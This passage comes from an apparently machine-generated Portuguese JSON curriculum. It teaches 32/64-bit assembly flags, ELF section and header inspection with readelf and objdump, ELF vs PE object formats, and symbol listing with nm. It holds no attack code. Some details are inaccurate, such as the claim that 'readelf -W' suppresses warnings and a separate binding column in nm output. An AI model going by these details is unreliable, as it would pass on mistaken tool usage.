                                  "learningObjective": "Dominar flags e convenções de montagem 64-bit.",
                                  "commonMistakes": [
                                    "Misturar int 0x80 em 64-bit (causa crash)",
                                    "Ignorar alinhamento de 64-bit",
                                    "Usar ld sem flags corretas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar flags de montagem e impactos em registradores e ponteiros",
                                  "subSteps": [
                                    "Compile o mesmo código fonte alterando apenas flags (-f elf32 vs -f elf64).",
                                    "Use objdump para comparar tamanhos de ponteiros (4 vs 8 bytes).",
                                    "Identifique diferenças: EAX/EBX vs RAX/RBX (prefixo R para 64-bit).",
                                    "Analise seção .text: instruções mov eax vs mov rax.",
                                    "Meça tamanhos de binários gerados (32-bit menor)."
                                  ],
                                  "verification": "Crie tabela comparativa em documento; confirme diferenças com hexdump ou readelf.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Dois arquivos .asm idênticos",
                                    "objdump",
                                    "readelf",
                                    "hexdump"
                                  ],
                                  "tips": "Use -g flag no nasm para debug symbols e facilitar análise.",
                                  "learningObjective": "Diferenciar impactos arquiteturais em registradores e ponteiros.",
                                  "commonMistakes": [
                                    "Confundir registradores (ex: usar EAX em 64-bit como 32-bit low)",
                                    "Não notar mudança em tamanho de endereço"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar diferenças em chamadas de sistema e praticar disassembly",
                                  "subSteps": [
                                    "Implemente sys_exit em ambos: int 0x80 (eax=1) vs syscall (rax=60).",
                                    "Disassemble ambos binários e compare opcodes.",
                                    "Teste execução em ambiente 32/64 compatível (ex: linux32 para 32-bit).",
                                    "Crie script para automatizar montagem e comparação.",
                                    "Documente 3 diferenças chave em relatório."
                                  ],
                                  "verification": "Execute scripts e valide que ambos funcionam; relatório cobre todas diferenças.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "ld",
                                    "objdump",
                                    "strace para trace syscalls"
                                  ],
                                  "tips": "Use strace para ver syscalls reais durante execução.",
                                  "learningObjective": "Comparar mecanismos de syscall e validar via análise prática.",
                                  "commonMistakes": [
                                    "Usar syscall numbers errados (32-bit vs 64-bit diferem)",
                                    "Executar 32-bit sem compatibilidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um 'Hello World' em assembly: em 32-bit use int 0x80 com eax=4 (sys_write), EAX/EBX; em 64-bit use syscall com rax=1, RDI/RSI/RDX. Monte com -f elf32/-f elf64, linke, execute e compare disassembly: note EAX vs RAX, ponteiro 4 vs 8 bytes, int vs syscall.",
                              "finalVerifications": [
                                "Explicar verbalmente flags -f elf32 vs -f elf64.",
                                "Listar 3 diferenças em registradores (EAX/RAX, etc.).",
                                "Demonstrar montagem e link de código 32/64-bit sem erros.",
                                "Identificar syscall int 0x80 vs syscall em disassembly.",
                                "Comparar tamanhos de ponteiros via readelf -h.",
                                "Trace syscalls com strace em ambos binários."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de flags e comandos de montagem (100% correto).",
                                "Correta comparação de registradores e impactos (sem confusões EAX/RAX).",
                                "Análise prática completa com disassembly e execução bem-sucedida.",
                                "Relatório comparativo claro com exemplos visuais (tabelas/objdump).",
                                "Compreensão de syscalls: explicar por que int 0x80 falha em 64-bit.",
                                "Tempo de execução dentro dos estimados com zero erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: registradores e modelos de memória.",
                                "Sistemas Operacionais: syscalls e ABIs (Application Binary Interface).",
                                "Programação em C: ponteiros e compilação para 32/64-bit.",
                                "Segurança Computacional: análise de binários cross-architecture."
                              ],
                              "realWorldApplication": "Em análise forense e reverse engineering de malware, diferenciar 32 vs 64-bit permite identificar binários legacy/exploits em sistemas híbridos, otimizar ferramentas de análise e explorar vulnerabilidades específicas de arquitetura em auditorias de segurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.2",
                        "name": "Estrutura de Arquivos Objeto Binários",
                        "description": "Analisa a organização interna de arquivos objeto, incluindo cabeçalhos, seções e tabelas que armazenam código, dados e metadados para linkage posterior.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.2.1",
                            "name": "Inspecionar seções de um arquivo objeto",
                            "description": "Usar 'readelf -S arquivo.o' ou 'objdump -h arquivo.o' para identificar seções como .text (código), .data (dados inicializados), .bss (dados não inicializados) e .rodata em formato ELF.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e compilar um arquivo objeto ELF simples",
                                  "subSteps": [
                                    "Instale as ferramentas necessárias: gcc e binutils (incluindo readelf e objdump) via gerenciador de pacotes (ex: apt install gcc binutils em Linux).",
                                    "Crie um arquivo C simples (ex: hello.c com função printf('Hello')).",
                                    "Compile o código para objeto usando 'gcc -c hello.c -o hello.o' (flag -c gera .o sem linking).",
                                    "Verifique a criação do arquivo com 'ls -la hello.o' e confirme tamanho >0."
                                  ],
                                  "verification": "Arquivo hello.o existe e tem tamanho maior que zero (use 'file hello.o' para confirmar formato ELF).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "Binutils (readelf, objdump)",
                                    "Editor de texto (vim/nano)",
                                    "Terminal Linux/WSL"
                                  ],
                                  "tips": "Sempre use flag -c para gerar objeto isolado; teste em ambiente Linux para compatibilidade ELF.",
                                  "learningObjective": "Entender o processo de compilação para gerar um binário objeto ELF básico.",
                                  "commonMistakes": [
                                    "Esquecer flag -c (gera executável em vez de .o)",
                                    "Não instalar binutils (readelf/objdump indisponíveis)",
                                    "Usar Windows sem WSL (ELF não nativo)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar seções usando readelf -S",
                                  "subSteps": [
                                    "Execute 'readelf -S hello.o' no terminal.",
                                    "Analise a saída: identifique colunas [Nr] (número), Name (nome da seção), Type (tipo), Address, Off (offset), Size.",
                                    "Localize seções comuns: .text (PROGBITS, código), .data (PROGBITS, dados init), .bss (NOBITS, dados não init), .rodata (PROGBITS, strings/constantes).",
                                    "Anote os offsets e tamanhos de cada seção relevante."
                                  ],
                                  "verification": "Comando roda sem erro e saída lista pelo menos .text, .data ou .bss com atributos corretos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal com hello.o",
                                    "readelf (de binutils)"
                                  ],
                                  "tips": "Use 'readelf -S hello.o | grep .text' para filtrar seções específicas; ignore seções como .eh_frame por agora.",
                                  "learningObjective": "Dominar readelf -S para listar e interpretar metadados de seções ELF.",
                                  "commonMistakes": [
                                    "Confundir Type PROGBITS com NOBITS (.bss é NOBITS)",
                                    "Ignorar headers e focar só em nomes",
                                    "Executar em binário errado (não ELF)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar seções usando objdump -h",
                                  "subSteps": [
                                    "Execute 'objdump -h hello.o' no terminal.",
                                    "Examine a tabela: colunas Idx (index), Name, Size, VMA/LMA, File off, Algn.",
                                    "Compare com readelf: confirme .text (código executável), .data (inicializado), .bss (zero-init), .rodata (somente leitura).",
                                    "Extraia detalhes como alignment e offsets para validação cruzada."
                                  ],
                                  "verification": "Saída mostra seções idênticas às do readelf, com tamanhos/offsets coincidentes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal com hello.o",
                                    "objdump (de binutils)"
                                  ],
                                  "tips": "'objdump -h -C hello.o' desmangle nomes de símbolos; compare saídas lado a lado com readelf.",
                                  "learningObjective": "Comparar ferramentas readelf vs objdump para inspeção de headers de seções.",
                                  "commonMistakes": [
                                    "Confundir VMA (virtual) com offset de arquivo",
                                    "Não notar que .bss tem size mas não ocupa espaço em disco",
                                    "Usar objdump sem -h (mostra disassembly em vez de headers)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e mapear seções para análise estrutural",
                                  "subSteps": [
                                    "Compare saídas de readelf e objdump: crie tabela manual com nome, tipo, offset, size para .text/.data/.bss/.rodata.",
                                    "Identifique propósitos: .text=código máquina, .data=globals init, .bss=globals uninit, .rodata=strings/const.",
                                    "Teste dump de seção específica: 'objdump -s -j .text hello.o' para ver conteúdo hex/ASCII.",
                                    "Documente insights em um arquivo texto para revisão."
                                  ],
                                  "verification": "Tabela resume corretamente 4+ seções com propósitos e métricas exatas da saída.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Editor para tabela (ex: Markdown ou TXT)",
                                    "hello.o"
                                  ],
                                  "tips": "Em segurança, foque em .text para exploits; use 'readelf -S | head -20' para overview rápido.",
                                  "learningObjective": "Mapear seções ELF a conceitos de memória e binários para análise avançada.",
                                  "commonMistakes": [
                                    "Atribuir .rodata como executável (é RO)",
                                    "Ignorar alignment (impacta padding/exploits)",
                                    "Não validar com dump de conteúdo"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie hello.c: int main(){char* msg=\"Hello\"; printf(msg);}. Compile: gcc -c hello.c -o hello.o. Rode readelf -S hello.o: veja .text em offset ~100, size ~50; .rodata com \"Hello\"; objdump -h confirma. Dump .text mostra código assembly.",
                              "finalVerifications": [
                                "Lista corretamente .text, .data, .bss, .rodata com readelf/objdump.",
                                "Explica tipos (PROGBITS/NOBITS) e propósitos de cada seção.",
                                "Compara saídas das duas ferramentas sem discrepâncias.",
                                "Dump de seção específica (ex: .text) mostra código válido.",
                                "Identifica offsets/tamanhos exatos para pelo menos 4 seções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de seções padrão ELF (100% match).",
                                "Interpretação correta de atributos (Type, Size, Offset) em 90%+ casos.",
                                "Uso fluido de readelf -S e objdump -h sem erros de sintaxe.",
                                "Análise comparativa entre ferramentas demonstra compreensão profunda.",
                                "Documentação clara de mapeamento seção->propósito."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender layout de memória em binários.",
                                "Sistemas Operacionais: Mapeamento de seções para segmentos de processo (text/data).",
                                "Segurança Computacional: Base para análise de binários em reverse engineering/malware.",
                                "Arquitetura de Computadores: Alinhamento e padding em seções ELF.",
                                "Ferramentas de Desenvolvimento: Uso de binutils em pipelines CI/CD."
                              ],
                              "realWorldApplication": "Em análise forense digital e engenharia reversa, inspetores usam readelf/objdump para dissecar malware, identificando payloads em .text ou strings em .rodata, auxiliando detecção de exploits em binários reais como em incidentes de cibersegurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.2.2",
                            "name": "Analisar cabeçalho ELF de arquivo objeto",
                            "description": "Examinar campos como e_ident, e_type (ET_REL para objeto), e_machine (EM_X86_64) e e_entry usando 'readelf -h arquivo.o', relacionando com arquitetura alvo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e gerar arquivo objeto ELF",
                                  "subSteps": [
                                    "Instale ferramentas necessárias: gcc, nasm e binutils (incluindo readelf).",
                                    "Compile um código simples em C ou assembly para gerar um arquivo .o (ex: gcc -c hello.c -o hello.o).",
                                    "Confirme que o arquivo foi gerado com 'ls -l hello.o' e verifique tamanho não zero.",
                                    "Execute 'file hello.o' para confirmar tipo 'ELF 64-bit LSB relocatable'.",
                                    "Anote o nome do arquivo e arquitetura alvo (ex: x86_64)."
                                  ],
                                  "verification": "Arquivo .o existe e 'file' confirma formato ELF relocatable.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC ou NASM",
                                    "Editor de texto",
                                    "Terminal Linux",
                                    "Código fonte simples (hello.c ou hello.s)"
                                  ],
                                  "tips": [
                                    "Use flags -c para compilar sem linkar.",
                                    "Teste em máquina x86_64 para consistência."
                                  ],
                                  "learningObjective": "Configurar ambiente para geração e inspeção inicial de binários ELF.",
                                  "commonMistakes": [
                                    "Esquecer flag -c (gera executável em vez de .o)",
                                    "Usar máquina não-x86_64 sem ajustar expectativas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar readelf -h para exibir cabeçalho ELF",
                                  "subSteps": [
                                    "Abra terminal no diretório do arquivo .o.",
                                    "Execute 'readelf -h hello.o' e capture a saída completa.",
                                    "Salve a saída em um arquivo texto para análise (ex: readelf -h hello.o > header.txt).",
                                    "Identifique seções principais: Magic, Class, Data, Version, OS/ABI, etc.",
                                    "Note o tamanho do cabeçalho (geralmente 64 bytes para ELF64)."
                                  ],
                                  "verification": "Saída de readelf -h mostra cabeçalho ELF sem erros de parsing.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "readelf (binutils)",
                                    "Terminal",
                                    "Arquivo .o gerado"
                                  ],
                                  "tips": [
                                    "Use 'readelf -hW' para saída wide se terminal estreito.",
                                    "Redirecione para arquivo para zoom/análise."
                                  ],
                                  "learningObjective": "Obter e visualizar dados brutos do cabeçalho ELF de forma confiável.",
                                  "commonMistakes": [
                                    "Executar readelf em executável linked em vez de .o",
                                    "Ignorar erros como 'not ELF file'."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar campos principais do cabeçalho: e_ident",
                                  "subSteps": [
                                    "Examine 'Magic': deve ser 7f 45 4c 46 (ELF em hex).",
                                    "Verifique 'Class': ELF64 (02) para x86_64.",
                                    "Confira 'Data': 2 para little-endian.",
                                    "Analise 'Version': 1 (01).",
                                    "Note 'OS/ABI': 0 para System V (Linux comum).",
                                    "Compare com documentação ELF para validar."
                                  ],
                                  "verification": "Todos campos e_ident interpretados corretamente conforme specs ELF.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Saída de readelf -h",
                                    "Especificação ELF (man elf ou online)",
                                    "Calculadora hex/bin"
                                  ],
                                  "tips": [
                                    "Use hexdump -C hello.o | head para ver magic bytes raw.",
                                    "Memorize magic: ~ELF."
                                  ],
                                  "learningObjective": "Interpretar e_ident para validar formato e endianness da arquitetura.",
                                  "commonMistakes": [
                                    "Confundir big/little-endian",
                                    "Ignorar ABI para cross-plataforma."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e_type, e_machine, e_entry e relacionar com arquitetura",
                                  "subSteps": [
                                    "Verifique e_type: 1 (ET_REL) para relocatable/object file.",
                                    "Confira e_machine: 0x3E (EM_X86_64).",
                                    "Analise e_entry: 0x0 ou endereço inicial para .o (não linked).",
                                    "Relacione: ET_REL + EM_X86_64 indica objeto x86_64 não-linkado.",
                                    "Compare com 'file' output e arquitetura da máquina ('uname -m').",
                                    "Teste variação: compile para ARM se possível e compare."
                                  ],
                                  "verification": "Correta identificação de ET_REL, EM_X86_64 e relação com target arch.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Saída readelf",
                                    "Tabela de e_machine values (ELF spec)",
                                    "Máquina x86_64"
                                  ],
                                  "tips": [
                                    "ET_REL != ET_EXEC (executável).",
                                    "e_entry muda após linking."
                                  ],
                                  "learningObjective": "Mapear campos de cabeçalho a propriedades do binário e arquitetura alvo.",
                                  "commonMistakes": [
                                    "Confundir ET_REL com ET_DYN/ET_EXEC",
                                    "Assumir e_machine da host sem verificar."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar consistência e documentar análise",
                                  "subSteps": [
                                    "Confira se todos campos batem: ex. Class=ELF64 com e_machine=EM_X86_64.",
                                    "Gere relatório: liste campos chave e interpretações.",
                                    "Teste com outro .o (ex: de assembly) para padrões.",
                                    "Use 'objdump -f hello.o' para cross-check.",
                                    "Anote discrepâncias potenciais em cenários maliciosos."
                                  ],
                                  "verification": "Relatório completo sem inconsistências identificadas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Múltiplos arquivos .o",
                                    "objdump",
                                    "Editor para relatório"
                                  ],
                                  "tips": [
                                    "Automate com script bash para múltiplos arquivos.",
                                    "Considere packing/obfuscation em malware."
                                  ],
                                  "learningObjective": "Sintetizar análise de cabeçalho ELF com verificações de consistência.",
                                  "commonMistakes": [
                                    "Não cross-check com objdump/file",
                                    "Ignorar Version ou Padding."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main(){return 0;}' como 'gcc -c empty.c -o empty.o', execute 'readelf -h empty.o'. Confirme: e_ident Magic=7f454c46, Class=ELF64, e_type=ET_REL (1), e_machine=EM_X86_64 (0x3E), e_entry=0x0. Relacione: objeto relocatable para Linux x86_64.",
                              "finalVerifications": [
                                "Magic bytes corretos (7f 45 4c 46).",
                                "e_type = 1 (ET_REL) para arquivo objeto.",
                                "e_machine = 0x3E (EM_X86_64) ou matching host.",
                                "e_ident Class/Data consistentes com arch.",
                                "Cabeçalho size = 64 bytes (ELF64).",
                                "Sem erros em readelf/objdump."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de e_ident (100% campos corretos).",
                                "Correta distinção ET_REL vs outros tipos.",
                                "Relacionamento explícito com arquitetura alvo.",
                                "Uso correto de ferramentas (readelf flags).",
                                "Identificação de pelo menos 3 potenciais inconsistências.",
                                "Relatório claro e estruturado."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly/C: Entender linking stages.",
                                "Sistemas Operacionais: Formatos executáveis e loaders.",
                                "Segurança Computacional: Detecção de binários maliciosos via header tampering.",
                                "Arquitetura de Computadores: Endianness e ISAs (x86_64).",
                                "Engenharia Reversa: Base para análise de malware."
                              ],
                              "realWorldApplication": "Em análise forense digital e segurança, inspetores usam readelf para validar binários suspeitos, detectando ofuscação em malware (ex: altered e_type para evasão) ou confirmar compatibilidade em supply chain attacks como SolarWinds."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.2.3",
                            "name": "Comparar formatos ELF e PE para objetos",
                            "description": "Destacar diferenças entre ELF (seções) e PE (seções com headers opcionais), focando em arquivos objeto (.o vs .obj) e ferramentas como dumpbin para PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a estrutura básica do formato ELF para arquivos objeto",
                                  "subSteps": [
                                    "Pesquise a documentação oficial do ELF no site da Linux Foundation ou man pages.",
                                    "Identifique componentes principais: cabeçalho ELF (e_ident, e_type=ET_REL para objetos), tabela de seções (.text, .data, .bss).",
                                    "Estude o cabeçalho de seções (sh_name, sh_type, sh_flags, sh_size).",
                                    "Compile um programa C simples com gcc -c para gerar .o e liste seções com readelf -S.",
                                    "Anote que ELF usa seções sem headers opcionais obrigatórios."
                                  ],
                                  "verification": "Execute readelf -h e readelf -S em um arquivo .o e interprete a saída corretamente.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "GCC compiler",
                                    "readelf tool (Linux)",
                                    "Documentação ELF",
                                    "Exemplo de código C simples"
                                  ],
                                  "tips": [
                                    "Use readelf -a para visão completa; foque em ET_REL para objetos."
                                  ],
                                  "learningObjective": "Compreender a organização de seções no ELF e ferramentas de inspeção.",
                                  "commonMistakes": [
                                    "Confundir executáveis (ET_EXEC) com objetos (ET_REL)",
                                    "Ignorar endianness no e_ident"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender a estrutura básica do formato PE para arquivos objeto",
                                  "subSteps": [
                                    "Acesse a documentação MSDN sobre PE format e foque em COFF para objetos (.obj).",
                                    "Identifique componentes: DOS header, PE header (signature 'PE\\0\\0'), Optional Header (opcional em objetos), Seções (.text, .data com headers).",
                                    "Estude cabeçalho de seções COFF (Name, VirtualSize, RawSize, Characteristics).",
                                    "Compile um programa C com cl.exe /c para gerar .obj e use dumpbin /headers.",
                                    "Note que PE objetos têm headers opcionais que podem ser ausentes."
                                  ],
                                  "verification": "Execute dumpbin /headers e dumpbin /section em um .obj e descreva a saída.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Visual Studio cl.exe (Windows)",
                                    "dumpbin tool",
                                    "Documentação PE/COFF MSDN",
                                    "Exemplo de código C simples"
                                  ],
                                  "tips": [
                                    "Instale Visual Studio Community gratuitamente; use dumpbin /all para detalhes."
                                  ],
                                  "learningObjective": "Dominar a hierarquia de headers e seções no PE para objetos.",
                                  "commonMistakes": [
                                    "Assumir Optional Header sempre presente em objetos",
                                    "Confundir PE executáveis com COFF objetos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e listar diferenças chave entre ELF e PE",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: ELF (seções puras, sem optional header obrigatório) vs PE (headers opcionais, COFF seções).",
                                    "Compare extensões: .o (ELF) vs .obj (PE); ferramentas (readelf vs dumpbin).",
                                    "Analise alinhamento, flags de seções e relocações.",
                                    "Discuta portabilidade: ELF Unix-like vs PE Windows.",
                                    "Revise exemplos de dumps lado a lado."
                                  ],
                                  "verification": "Produza uma tabela com pelo menos 8 diferenças documentadas com evidências de dumps.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Arquivos .o e .obj de exemplos idênticos",
                                    "Editor de texto ou planilha"
                                  ],
                                  "tips": [
                                    "Compile o mesmo código fonte em ambas plataformas para fair comparison."
                                  ],
                                  "learningObjective": "Capacitar comparação precisa das estruturas binárias.",
                                  "commonMistakes": [
                                    "Ignorar diferenças em relocações (R_* em ELF vs IMAGE_REL em PE)",
                                    "Focar só em executáveis, não objetos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar análise comparativa com ferramentas reais",
                                  "subSteps": [
                                    "Compile um programa C com símbolos globais em Linux (gcc -c) e Windows (cl /c).",
                                    "Use readelf -S -s no .o e dumpbin /section:all no .obj.",
                                    "Compare saídas: número de seções, tamanhos, nomes, permissões.",
                                    "Identifique headers opcionais ausentes no PE objeto.",
                                    "Documente achados em um relatório curto."
                                  ],
                                  "verification": "Gere dumps e explique 5 diferenças observadas em um relatório.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "Máquinas Linux/Windows ou VM",
                                    "Código C com funções e variáveis globais",
                                    "readelf, dumpbin"
                                  ],
                                  "tips": [
                                    "Use WSL para Linux no Windows; padronize código fonte."
                                  ],
                                  "learningObjective": "Aplicar conhecimento em análise prática de binários.",
                                  "commonMistakes": [
                                    "Não usar flags corretas nas ferramentas",
                                    "Comparar versões otimizadas vs debug"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int global_var = 42; void func() {}' como main.c. No Linux: gcc -c main.c -> main.o, readelf -S main.o. No Windows: cl /c main.c -> main.obj, dumpbin /headers main.obj. Compare seções: ELF tem .rodata sem optional header rígido; PE tem COFF headers flexíveis.",
                              "finalVerifications": [
                                "Liste corretamente 8+ diferenças entre ELF e PE objetos.",
                                "Interprete dumps de readelf e dumpbin sem erros.",
                                "Explique ausência de optional header em PE objetos.",
                                "Compare relocações e símbolos entre formatos.",
                                "Crie tabela comparativa precisa.",
                                "Identifique ferramentas adequadas por plataforma."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de estruturas (90%+ correto).",
                                "Profundidade da comparação (cobertura de headers, seções, flags).",
                                "Uso correto de ferramentas e interpretação de saídas.",
                                "Clareza na tabela/relatório comparativo.",
                                "Identificação de erros comuns e como evitá-los.",
                                "Aplicação prática com exemplos reais."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como código vira binário.",
                                "Sistemas Operacionais: Diferenças Unix vs Windows loaders.",
                                "Segurança Computacional: Base para reverse engineering e análise de malware.",
                                "Engenharia de Software: Portabilidade de código objeto.",
                                "Análise de Binários: Ferramentas como objdump/readelf/dumpbin."
                              ],
                              "realWorldApplication": "Em análise de malware, comparar ELF/PE ajuda a detectar cross-platform threats; em desenvolvimento, facilita debugging de linkers; em forense digital, inspeciona objetos suspeitos para vulnerabilidades ou backdoors."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.3",
                        "name": "Símbolos e Tabelas de Relocação",
                        "description": "Compreende como símbolos (funções, variáveis) são catalogados e relocações resolvem endereços pendentes durante a montagem e linkage.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.3.1",
                            "name": "Listar e interpretar símbolos em arquivo objeto",
                            "description": "Empregar 'nm arquivo.o' ou 'readelf -s arquivo.o' para visualizar tabela de símbolos, distinguindo tipos (T para texto, D para dados, U para indefinido) e binding (local/global).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e criar arquivo objeto simples",
                                  "subSteps": [
                                    "Instale ferramentas essenciais: gcc e binutils (nm e readelf) em um terminal Linux ou WSL.",
                                    "Crie um arquivo C simples com funções locais e globais, ex: int global_var = 10; static int local_var = 20; void func() {}.",
                                    "Compile para objeto: gcc -c programa.c -o programa.o",
                                    "Verifique criação: ls -la programa.o",
                                    "Examine tamanho e permissões do arquivo gerado."
                                  ],
                                  "verification": "Confirme que programa.o existe e tem tamanho >0 bytes via ls -la.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Terminal Linux/WSL, editor de texto (vim/nano), gcc instalado",
                                  "tips": "Use -Wall no gcc para warnings durante compilação.",
                                  "learningObjective": "Entender o processo de geração de código objeto a partir de fonte C.",
                                  "commonMistakes": "Esquecer de usar -c (compila e linka para executável); não declarar variáveis/funções explicitamente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listar símbolos usando o comando nm",
                                  "subSteps": [
                                    "Execute nm programa.o e observe a saída tabular.",
                                    "Identifique colunas: endereço (00000000), tipo (T/D/U/B), binding (t/d/u/g), nome do símbolo.",
                                    "Registre símbolos como main (T g), global_var (D g), local_var (d local).",
                                    "Redirecione saída para arquivo: nm programa.o > simbolos.txt e abra para análise.",
                                    "Teste nm -a para incluir debug symbols se compilado com -g."
                                  ],
                                  "verification": "Saída do nm mostra pelo menos 5-10 símbolos com tipos T, D, U visíveis.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Terminal com programa.o pronto",
                                  "tips": "Use nm --help para opções; pipe para grep: nm programa.o | grep main.",
                                  "learningObjective": "Dominar a sintaxe e saída básica do nm em arquivos objeto.",
                                  "commonMistakes": "Executar nm em executável (.out) em vez de .o; ignorar binding (maiúscula global, minúscula local)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar tipos e binding de símbolos",
                                  "subSteps": [
                                    "Classifique tipos: T (texto/código), D (dados inicializados), U (indefinido), B (BSS não inicializado).",
                                    "Diferencie binding: maiúscula (global/exportado), minúscula (local/estático).",
                                    "Anote exemplos: func() como T g (global texto), static_func como t (local texto).",
                                    "Modifique código adicionando static/global e recompile para comparar saídas nm.",
                                    "Crie tabela manual: símbolo | tipo | binding | interpretação."
                                  ],
                                  "verification": "Crie um resumo escrito distinguindo corretamente 3 símbolos de cada tipo/binding.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "programa.o múltiplas versões, papel ou editor para tabela",
                                  "tips": "Lembre: U indica dependência externa para linker.",
                                  "learningObjective": "Capacidade de decodificar e explicar significado de cada símbolo listado.",
                                  "commonMistakes": "Confundir T (texto) com D (dados); assumir todos maiúsculos como locais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Usar readelf como alternativa e validar interpretação",
                                  "subSteps": [
                                    "Execute readelf -s programa.o e compare formato com nm.",
                                    "Identifique seções: Num, Value, Size, Type (FUNC/OBJECT/NOTYPE), Bind (LOCAL/GLOBAL), Ndx, Name.",
                                    "Mapeie equivalências: readelf Type FUNC ~ nm T; Bind GLOBAL ~ g.",
                                    "Execute ambos comandos lado a lado: diff <(nm prog.o) <(readelf -s prog.o | awk '{print $1,$2,$6,$8}')",
                                    "Teste em arquivo com múltiplos .o: gcc -c mod1.c mod2.c; nm mod1.o mod2.o."
                                  ],
                                  "verification": "Interprete saída readelf para os mesmos símbolos do nm sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "readelf disponível (binutils), múltiplos arquivos .o",
                                  "tips": "readelf é mais verbose; use -W para suprimir warnings.",
                                  "learningObjective": "Comparar ferramentas e reforçar interpretação cross-tool.",
                                  "commonMistakes": "Ignorar coluna Bind no readelf; não notar diferenças em formatação."
                                }
                              ],
                              "practicalExample": "Crie programa.c: #include <stdio.h> int global=1; static int local=2; void global_func(){printf('G');} static void local_func(){printf('L');} int main(){return 0;} Compile: gcc -c programa.c -o programa.o. nm programa.o mostra: 0000000000000000 T global_func (global texto), 0000000000000000 t local_func (local texto), U printf (indefinido). Interprete: global_func linkável externamente, local_func só interna.",
                              "finalVerifications": [
                                "Lista símbolos de um .o com nm e readelf sem erros de sintaxe.",
                                "Classifica corretamente tipos T/D/U/B em pelo menos 80% dos símbolos.",
                                "Distingue binding local/global via maiúsc/minúsc ou readelf Bind.",
                                "Explica propósito de U (undefined) em contexto de linking.",
                                "Compara saídas nm vs readelf para 5 símbolos idênticos.",
                                "Identifica símbolos de um programa com static/global em código fonte."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos (100% sucesso em listagem).",
                                "Correta interpretação de 90%+ dos tipos e bindings.",
                                "Tabela de símbolos manual completa e sem erros.",
                                "Uso correto de opções adicionais como -a ou -g.",
                                "Explicação verbal/escrita clara de pelo menos 3 símbolos complexos.",
                                "Aplicação em arquivo .o não-trivial (múltiplas funções/variáveis).",
                                "Tempo de execução dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender escopo static vs global.",
                                "Assembly e Arquitetura: Símbolos mapeiam para seções .text/.data.",
                                "Segurança Binária: Identificar entry points para exploração (ex: main como T g).",
                                "Debugging: nm/readelf usados em gdb para símbolos.",
                                "Compiladores/Linkers: Preparação para relocação e linking estático/dinâmico."
                              ],
